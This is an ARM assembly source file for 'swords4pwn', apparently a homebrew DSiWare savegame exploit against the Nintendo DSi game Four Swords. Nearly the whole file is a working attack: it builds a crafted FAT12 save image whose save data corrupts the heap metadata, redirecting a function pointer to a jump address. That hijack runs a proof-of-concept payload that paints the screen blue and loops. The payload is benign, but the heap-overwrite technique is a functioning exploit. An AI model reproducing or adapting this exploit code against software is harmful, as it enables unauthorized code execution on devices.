/* swords4pwn by ChampionLeake */
/* 4swords dsiware exploit */
/* HUGE THANKS TO yellows8 as the original exploiter and helper */
/* Special thanks to everyone who tested and gave helpful advice */

.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init
.arm

#define	REG_BASE	0x04000000

/* Courtesy from yellows8 4swordshax repo*/
#define HEAPCTX_ADR 0x2177090
#define HEAP_NEXTCHUNKADR HEAPCTX_ADR+0x58
#define JUMPADR HEAP_NEXTCHUNKADR+0x10
#define TARGET_FUNCPTR 0x20c90dc+0x24

_start:
@ header of the save
.word 0xE900004D, 0x5357494E, 0x342E3100, 0x02010100
.word 0x0220001B, 0x00F80100, 0x03000300, 0x00000000
.word 0x00000000
.byte 0x05, 0x00, 0x29
.ascii "xV4.VOLUMELABELFAT12"
.byte 0x20, 0x20, 0x20, 0x00, 0x00

.space (_start + 0x1fe) - .
.byte 0x55, 0xAA, 0xF8, 0xFF, 0xFF, 0xFF, 0x0F
.word 0x00000000
.byte 0x00
.byte 0x80, 0x00, 0x09, 0xA0, 0x00, 0xFF, 0xCF, 0x00, 0x0D, 0xE0, 0x00, 0x0F, 0xF0, 0xFF

.space (_start + 0x400) - .
.byte 0xF8, 0xFF, 0xFF, 0xFF, 0x0F
.word 0x00000000
.byte 0x00
.byte 0x80, 0x00, 0x09, 0xA0, 0x00, 0xFF, 0xCF, 0x00, 0x0D, 0xE0, 0x00, 0x0F, 0xF0, 0xFF

.space (_start + 0x600) - .
@ save can be mounted to oversee 2 savefiles, "all.dat" and "backup.dat"
.word 0x41730061, 0x00760065, 0x0064000F, 0x00046100
.word 0x74006100, 0x0000FFFF, 0xFFFF0000, 0xFFFFFFFF
.word 0x53415645, 0x44415441, 0x20202010, 0x0000C2B1
.word 0x874C894C, 0x0000C2B1, 0x874C0200, 0x00000000

.space (_start + 0xA00) - .
.incbin "mount_usage.bin" @ savedata mount data
@ states what files to read from ; this includes the 2 saves all.dat and backup.dat

/* actually save within the savefile */
@ save header 0x800 bytes long ; no crc ; 
.incbin "initial.bin" @ base savefile
	
@	swords4pwn -- heaphax
@	attacking the heap functions
.incbin "initial.bin"	@ base of the save
@ attacks the heap
.word 0, 0
.word HEAPCTX_ADR
.word 0
.word 0
.word HEAPCTX_ADR+4
.space 0x24
.word HEAP_NEXTCHUNKADR
.word 0
.word 0
.word TARGET_FUNCPTR-12
.hword 0
.hword 0
	
.space 0x50-0x34

.word 0
.word 0x1000
.word TARGET_FUNCPTR-12
.word JUMPADR

.align 2
code_start:
b code
.word 0
.word 0
.word 0 @ "The data here will be overwritten by the memalloc code, so branch around it." (yellows8)

/* magic */
/* blue screen payload */
/* thanks Gericom */

code: 
mov r0, #0x04000000
mov r1, #0
str r1, [r0, #0x208]
str r1, [r0, #0x210]
ldr r2, [r0, #0x214]
str r2, [r0, #0x214]
mov r2, #(1<<16)
str r2, [r0]
str r1, [r0, #0x60]
mov r0, #0x05000000
mov r1, #(0x1F << 10)	@ blue like the marker
strh r1, [r0]
b .	@ infinite loop to ensure this runs
.pool

.space (_start + 0x2600) - .
.word 0x020050E1, 0xFBFFFF1A, 0x1EFF2FE1, 0x01C3A0E3
.word 0x08C28CE5, 0x063D8CE2, 0x050CA0E3, 0xB000C3E1
.word 0x08009FE5, 0x0E15A0E3, 0x000081E5, 0x11FF2FE1
.word 0xFEFFFFEA, 0x78200000, 0x24FCFF02
	
.space (_start + 0x4000) - .	@ savefile itself is 0x4000 bytes long